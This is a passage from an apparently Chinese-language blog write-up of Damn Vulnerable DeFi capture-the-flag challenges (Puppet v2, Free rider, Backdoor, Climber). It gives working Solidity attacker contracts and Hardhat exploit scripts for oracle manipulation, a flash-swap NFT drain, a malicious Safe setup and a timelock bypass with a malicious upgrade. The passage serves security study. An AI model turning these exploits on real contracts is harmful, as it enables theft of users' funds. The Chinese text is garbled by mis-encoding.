class="hljs-attr">value</span>:collateral&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Puppet-v2"><a href="#Puppet-v2" class="headerlink" title="Puppet v2"></a>Puppet v2</h2><blockquote><p>The developers of the <a href="https://www.damnvulnerabledefi.xyz/challenges/8.html">last lending pool</a> are saying that theyâ€™ve learned the lesson. And just released a new version!</p><p>Now theyâ€™re using a <a href="https://docs.uniswap.org/protocol/V2/introduction">Uniswap v2 exchange</a> as a price oracle, along with the recommended utility libraries. That should be enough.</p><p>You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;<br>    (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(<br>        _uniswapFactory, address(_weth), address(_token)<br>    );<br>    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ”»å‡»é€»è¾‘å’Œä¸Šä¸€é¢˜ä¸€æ ·</p><p><a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/trading-from-a-smart-contract">ä¸¤ç§ä»£å¸äº¤æ¢æ–¹æ³•</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.token.connect(attacker).approve(<span class="hljs-built_in">this</span>.uniswapRouter.address,ATTACKER_INITIAL_TOKEN_BALANCE);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, <span class="hljs-number">1</span>, [<span class="hljs-built_in">this</span>.token.address, <span class="hljs-built_in">this</span>.weth.address], attacker.address, ((<span class="hljs-keyword">await</span> ethers.provider.getBlock(<span class="hljs-string">&#x27;latest&#x27;</span>)).timestamp * <span class="hljs-number">2</span>));<br><br>    <span class="hljs-keyword">const</span> collateral = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);<br>    <span class="hljs-comment">// å°†ETHè½¬æ¢ä¸º WETH</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.weth.connect(attacker).deposit(&#123; <span class="hljs-attr">value</span>: collateral &#125;);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.weth.connect(attacker).approve(<span class="hljs-built_in">this</span>.lendingPool.address, collateral);<br>    <span class="hljs-comment">//å€Ÿå‡ºå…¨éƒ¨ä»£å¸</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Free-rider"><a href="#Free-rider" class="headerlink" title="Free rider"></a>Free rider</h2><blockquote><p>A new marketplace of Damn Valuable NFTs has been released! Thereâ€™s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p><p>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesnâ€™t know how to do it. So itâ€™s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p><p>You want to build some rep with this buyer, so youâ€™ve agreed with the plan.</p><p>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;<br>    for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;<br>        _buyOne(tokenIds[i]);<br>    &#125;<br>&#125;<br><br>function _buyOne(uint256 tokenId) private &#123;       <br>    uint256 priceToPay = offers[tokenId];<br>    require(priceToPay &gt; 0, &quot;Token is not being offered&quot;);<br><br>    require(msg.value &gt;= priceToPay, &quot;Amount paid is not enough&quot;);<br><br>    amountOfOffers--;<br><br>    // transfer from seller to buyer<br>    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);<br><br>    // pay seller<br>    payable(token.ownerOf(tokenId)).sendValue(priceToPay);<br><br>    emit NFTBought(msg.sender, tokenId, priceToPay);<br>&#125;    <br></code></pre></td></tr></table></figure><p>å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li>ä¸€ä¸ªäº¤æ˜“ä¸­ä½¿ç”¨åŒä¸€ä¸ª msg.value ï¼Œæˆ‘ä»¬åªè¦æ»¡è¶³ msg.value &gt;= æœ€é«˜ä»·æ ¼å³å¯è´­ä¹°ä¸‹å…¨éƒ¨çš„ NFT</li><li>å…ˆè½¬ç§» NFT çš„æ‹¥æœ‰æƒå†è½¬è´¦ï¼Œæ˜¯è‡ªå·±å¯¹è‡ªå·±è½¬è´¦</li></ol><p>æ–¹æ¡ˆï¼š</p><ol><li>åˆ©ç”¨ <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair#swap-1">UniswapV2 Flash Swap</a> å€Ÿ 15 ETH</li><li>å°† 6 ä¸ª NFT å…¨éƒ¨ä¹°èµ°ï¼Œæ­¤æ—¶æ”»å‡»è€…è´¦æˆ·ä¸­æ‹¥æœ‰ 90 ETH</li><li>å°†è¿™ 6 ä¸ª NFT è½¬ç§»åˆ°ä¹°æ–¹åˆçº¦ä¸­ï¼Œä¸ºæ”»å‡»è€…èµšå– 45 ETH</li><li>å½’è¿˜é—ªè´·</li></ol><p>å¯ä»¥å‚è€ƒ <a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps">Flash Swaps</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../free-rider/FreeRiderBuyer.sol&quot;;<br>import &quot;../free-rider/FreeRiderNFTMarketplace.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol&quot;;<br><br>interface IUniswapV2Pair &#123;<br>    // token0 : weth<br>    // token1 : DTV<br>    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;<br>&#125;<br><br>interface IWETH &#123;<br>    function transfer(address recipient, uint256 amount) external returns (bool);<br>    function deposit() external payable;<br>    function withdraw(uint256 amount) external;<br>    function balanceOf(address) external returns (uint);<br>&#125;<br><br>contract FreeRiderAttacker &#123;<br>    address uniswapV2Pair;<br>    IWETH immutable weth;<br>    FreeRiderNFTMarketplace freeRiderNFTMarketplace;<br>    address buyer;<br>    DamnValuableNFT NFT;<br><br>    uint256[] public tokenIds = [0,1,2,3,4,5];<br><br>    constructor(<br>        address _uniswapV2Pair,<br>        IWETH _weth,<br>        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,<br>        address _buyer,<br>        DamnValuableNFT _NFT<br>    ) &#123;<br>        uniswapV2Pair = _uniswapV2Pair;<br>        weth = _weth;<br>        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;<br>        buyer = _buyer;<br>        NFT = _NFT;<br>    &#125;<br><br>    function attack(uint256 amount) public &#123;<br>        //é—ªè´·<br>        bytes memory data = &quot;ATTACK&quot;;<br>        IUniswapV2Pair(uniswapV2Pair).swap(amount,0,address(this),data);<br>    &#125;<br><br>    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public &#123;<br>        //å–å‡ºé—ªè´·çš„weth<br>        weth.withdraw(amount0);<br>        //è´­ä¹°6ä¸ªNFT<br>        freeRiderNFTMarketplace.buyMany&#123;value: address(this).balance&#125;(tokenIds);<br>        //å­˜å›æ± ä¸­<br>        weth.deposit&#123;value: address(this).balance&#125;();<br>        //å½’è¿˜é—ªè´·<br>        weth.transfer(uniswapV2Pair, weth.balanceOf(address(this)));<br>        //å°†NFTè½¬ç§»åˆ°ä¹°æ–¹åˆçº¦ä¸­<br>        for(uint256 i=0 ; i&lt;tokenIds.length ; i++) &#123;<br>            NFT.safeTransferFrom(address(this), buyer, i);<br>        &#125;<br>    &#125;<br><br>    //å®ç°é¢å¤–çš„åŠŸèƒ½ onERC721Received æ¥æ¥æ”¶ NFT<br>    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) &#123;<br>        return IERC721Receiver.onERC721Received.selector;<br>    &#125;<br><br>    receive() external payable &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">const</span> Attacker = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;FreeRiderAttacker&#x27;</span>, deployer)).deploy(<br>        <span class="hljs-built_in">this</span>.uniswapPair.address,<br>        <span class="hljs-built_in">this</span>.weth.address,<br>        <span class="hljs-built_in">this</span>.marketplace.address,<br>        <span class="hljs-built_in">this</span>.buyerContract.address,<br>        <span class="hljs-built_in">this</span>.nft.address<br>    );<br>    Attacker.connect(attacker).attack(ethers.utils.parseEther(<span class="hljs-string">&quot;15&quot;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><blockquote><p>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of <a href="https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol">Gnosis Safe wallets</a>. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.</p><p>To make sure everything is safe and sound, the registry tightly integrates with the legitimate <a href="https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol">Gnosis Safe Proxy Factory</a>, and has some additional safety checks.</p><p>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.</p><p>Your goal is to take all funds from the registry. In a single transaction.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setup(<br>    address[] calldata _owners,<br>    uint256 _threshold,<br>    address to,<br>    bytes calldata data,<br>    address fallbackHandler,<br>    address paymentToken,<br>    uint256 payment,<br>    address payable paymentReceiver<br>) external &#123;<br>    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice<br>    setupOwners(_owners, _threshold);<br>    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);<br>    // As setupOwners can only be called if the contract has not been initialized we don&#x27;t need a check for setupModules<br>    setupModules(to, data);<br><br>    if (payment &gt; 0) &#123;<br>        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)<br>        // baseGas = 0, gasPrice = 1 and gas = payment =&gt; amount = (payment + 0) * 1 = payment<br>        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);<br>    &#125;<br>    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);<br>&#125;<br><br><br>function setupModules(address to, bytes memory data) internal &#123;<br>    require(modules[SENTINEL_MODULES] == address(0), &quot;GS100&quot;);<br>    modules[SENTINEL_MODULES] = SENTINEL_MODULES;<br>    if (to != address(0))<br>        // Setup has to complete successfully or transaction fails.<br>        require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), &quot;GS000&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/157584696">å¦‚ä½•ç”¨solidityæ‰“é€ å¯å‡çº§æ™ºèƒ½åˆçº¦</a></p><p><a href="https://www.learnblockchain.cn/article/1991">ç¼–å†™å¯å‡çº§çš„æ™ºèƒ½åˆçº¦</a></p><p><a href="https://www.kiendt.me/2022/03/20/damn-vulnerable-defi-11/">å‚è€ƒé¢˜è§£</a></p><p>ä½¿ç”¨ <code>approve</code> èµ‹äºˆæ”»å‡»åˆçº¦å…ˆèŠ±é’±çš„æƒåˆ©ï¼Œç„¶åå†ä»é’±åŒ…ä¸­æç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br>import &quot;@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol&quot;;<br>import &quot;@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol&quot;;<br>import &quot;@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol&quot;;<br><br>contract BackDoorAttacker &#123;<br>    GnosisSafeProxyFactory public factory;<br>    IProxyCreationCallback public callback;<br>    address[] public users;<br>    address public singleton;<br>    address token;<br><br>    constructor(<br>        address _factory,<br>        address _singleton,<br>        address _callback,<br>        address[] memory _users,<br>        address _token<br>    ) &#123;<br>        factory = GnosisSafeProxyFactory(_factory);<br>        singleton = _singleton;<br>        callback = IProxyCreationCallback(_callback);<br>        users = _users;<br>        token = _token;<br>    &#125;<br><br>    function approve(address _token,address spender) public &#123;<br>        IERC20(_token).approve(spender,10 ether);<br>    &#125;<br><br>    function attack() external &#123;<br>        bytes memory data = abi.encodeWithSignature(<br>            &quot;approve(address,address)&quot;,<br>            token,<br>            address(this)<br>        );<br>        for (uint256 i = 0; i &lt; users.length; i++) &#123;<br>            address[] memory owners = new address[](1);<br>            owners[0] = users[i];<br><br>            bytes memory initializer = abi.encodeWithSignature(<br>                &quot;setup(address[],uint256,address,bytes,address,address,uint256,address)&quot;,<br>                owners,<br>                1,<br>                address(this),<br>                data,<br>                address(0),<br>                address(0),<br>                0,<br>                address(0)<br>            );<br>            GnosisSafeProxy proxy = factory.createProxyWithCallback(<br>                singleton,<br>                initializer,<br>                0,<br>                callback<br>            );<br><br>            IERC20(token).transferFrom(address(proxy), tx.origin, 10 ether);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">const</span> Attacker = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;BackDoorAttacker&#x27;</span>, attacker)).deploy(<br>        <span class="hljs-built_in">this</span>.walletFactory.address,<br>        <span class="hljs-built_in">this</span>.masterCopy.address,<br>        <span class="hljs-built_in">this</span>.walletRegistry.address,<br>        users,<br>        <span class="hljs-built_in">this</span>.token.address<br>    );<br>    <span class="hljs-keyword">await</span> Attacker.connect(attacker).attack();<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Climber"><a href="#Climber" class="headerlink" title="Climber"></a>Climber</h2><blockquote><p>Thereâ€™s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the <a href="https://eips.ethereum.org/EIPS/eip-1822">UUPS pattern</a>.</p><p>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.</p><p>On the vault thereâ€™s an additional role with powers to sweep all tokens in case of an emergency.</p><p>On the timelock, only an account with a â€œProposerâ€ role can schedule actions that can be executed 1 hour later.</p><p>Your goal is to empty the vault.</p></blockquote><p><code>ClimberTimelock</code> ä¸­çš„ <code>execute</code> æœ‰ä¸€ä¸ªæ¼æ´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">for (uint8 i = 0; i &lt; targets.length; i++) &#123;<br>    targets[i].functionCallWithValue(dataElements[i], values[i]);<br>&#125;<br><br>require(getOperationState(id) == OperationState.ReadyForExecution);<br>operations[id].executed = true;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç è¿åäº† check-effect-action è§„åˆ™ï¼šæ€»æ˜¯å…ˆæ£€æŸ¥æ¡ä»¶ï¼Œç„¶åè®¾ç½®æ•ˆæœï¼Œç„¶åæ‰§è¡Œé€»è¾‘ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å…ˆæ‰§è¡Œé€»è¾‘ï¼Œç„¶åæ£€æŸ¥æ¡ä»¶å¹¶è®¾ç½®æ•ˆæœã€‚</p><ul><li>æˆäºˆ <code>PROPOSER_ROLE</code> èº«ä»½ç»™æ”»å‡»åˆçº¦ï¼ˆä»¥ä¾¿æ”»å‡»åˆçº¦å¯ä»¥ä»è¿™é‡Œè°ƒç”¨è¯¥å‡½æ•° <code>schedule</code> ï¼‰</li><li>è½¬ç§»é‡‘åº“æ‰€æœ‰æƒç»™æ”»å‡»è€…</li><li>åœ¨æ”»å‡»åˆçº¦ä¸­ï¼Œæˆ‘ä»¬å®‰æ’åŠ¨ä½œåºåˆ— <code>grantRole,transferOwnership,schedule</code></li><li>å‡†å¤‡åˆçº¦ <code>ClimberVaultV2</code> ï¼Œç§»é™¤æ¡ä»¶ <code>onlySweeper</code> ï¼Œå†…éƒ¨è½¬è´¦ç»™æ”»å‡»è€…ã€‚</li><li>ä½¿ç”¨ <code>upgrades.upgradeProxy</code> å‡çº§åˆçº¦</li></ul><p><a href="https://www.kiendt.me/2022/03/21/damn-vulnerable-defi-12/">å‚è€ƒ</a> </p><p><a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/hardhat-upgrades">Using Proxies with Hardhat</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;./ClimberVault.sol&quot;;<br>import &quot;./ClimberTimelock.sol&quot;;<br><br>contract ClimberAttacker &#123;<br>    ClimberVault public immutable vault;<br>    address payable timelock;<br><br>    address[] public targets;<br>    uint256[] public values;<br>    bytes[] public dataElements;<br><br>    constructor(address _vault, address payable _timelock) &#123;<br>        vault = ClimberVault(_vault);<br>        timelock = _timelock;<br>    &#125;<br><br>    function attack(address attacker) external &#123;<br>        targets.push(timelock);<br>        targets.push(address(vault));<br>        targets.push(address(this));<br>        values.push(0);<br>        values.push(0);<br>        values.push(0);<br><br>        bytes memory data0 = abi.encodeWithSignature(<br>            &quot;grantRole(bytes32,address)&quot;,<br>            keccak256(&quot;PROPOSER_ROLE&quot;),<br>            address(this)<br>        );<br><br>        bytes memory data1 = abi.encodeWithSignature(<br>            &quot;transferOwnership(address)&quot;,<br>            attacker<br>        );<br><br>        bytes memory data2 = abi.encodeWithSignature(&quot;schedule()&quot;);<br><br>        dataElements.push(data0);<br>        dataElements.push(data1);<br>        dataElements.push(data2);<br><br>        ClimberTimelock(timelock).execute(targets, values, dataElements, keccak256(&quot;salt&quot;));<br>    &#125;<br><br>    function schedule() external &#123;<br>        ClimberTimelock(timelock).schedule(targets, values, dataElements, keccak256(&quot;salt&quot;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡†å¤‡ ClimberVaultV2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br><br>import &quot;./ClimberTimelock.sol&quot;;<br><br>/**<br> * @title ClimberVault<br> * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.<br> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)<br> */<br>contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;<br><br>    ...<br><br>    // Allows trusted sweeper account to retrieve any tokens<br>    function sweepFundsV2(address tokenAddress) external &#123;<br>        IERC20 token = IERC20(tokenAddress);<br>        require(token.transfer(tx.origin, token.balanceOf(address(this))), &quot;Transfer failed&quot;);<br>    &#125;<br><br>    ...<br>    <br>    function _authorizeUpgrade(address newImplementation) internal onlyOwner override &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-comment">//å°† CimberVault çš„æ‰€æœ‰è€…æ›´æ”¹ä¸ºæ”»å‡»è€…</span><br>    <span class="hljs-keyword">const</span> Attack = <span class="hljs-keyword">await</span> (<span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;ClimberAttacker&#x27;</span>, attacker)).deploy(<br>        <span class="hljs-built_in">this</span>.vault.address, <span class="hljs-built_in">this</span>.timelock.address<br>    );<br>    <span class="hljs-keyword">await</span> Attack.connect(attacker).attack(attacker.address);<br>    <span class="hljs-comment">//å‡çº§åˆçº¦</span><br>    <span class="hljs-keyword">const</span> vaultV2 = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;ClimberVaultV2&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> attacker_vault = <span class="hljs-keyword">await</span> upgrades.upgradeProxy(<span class="hljs-built_in">this</span>.vault.address, vaultV2);<br>    <span class="hljs-comment">//è€—å°½æ‰€æœ‰ä»£å¸</span><br>    <span class="hljs-keyword">await</span> attacker_vault.connect(attacker).sweepFundsV2(<span 